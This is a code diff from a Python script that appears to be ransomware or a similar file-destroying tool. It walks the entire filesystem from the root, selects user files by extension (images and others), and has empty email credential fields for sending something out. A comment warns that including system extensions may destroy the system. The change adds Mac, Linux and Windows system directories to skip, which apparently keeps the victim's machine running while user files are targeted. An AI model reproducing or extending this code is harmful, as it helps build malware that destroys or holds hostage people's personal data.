@@ -21,6 +21,21 @@ sender_email = ""  # Enter your address
 receiver_email = ""  # Enter receiver address
 password = "" # your email password
 
+EXCLUDE_DIRECTORY = ('/usr', #Mac/Linux system directory
+                    '/Library/',
+                    '/System',
+                    '/Applications',
+                    '.Trash',
+                    #Windows system directory
+                    'Program Files',
+                    'Program Files (x86)',
+                    'Windows',
+                    '$Recycle.Bin',
+                    'AppData',
+
+)
+
+
 EXCLUDE = (
         # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
@@ -78,9 +93,9 @@ def FindFiles():
         for root, dirs, files in os.walk("/"):
         # for root, files in os.walk("/YOUR/TESTING/DIRECTORY"):   
                 for dir in dirs:
-                    if any(s in root for s in EXCLUDE):
-                        pass
+                    if any(s in root for s in EXCLUDE_DIRECTORY):
                         spinner.next()
+                        pass
                     else:
                         for file in files:
                             if file.endswith(EXCLUDE):
